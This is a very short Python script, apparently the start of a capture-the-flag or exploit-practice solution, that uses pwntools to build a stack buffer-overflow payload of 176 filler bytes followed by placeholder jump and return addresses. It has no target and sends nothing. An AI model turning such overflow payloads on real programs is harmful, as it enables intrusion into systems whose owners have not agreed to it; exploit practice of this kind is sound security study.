from pwn import *

payload = '0'*176
payload+= 'A'*8 # jmp address
payload+= 'B'*8 # return address


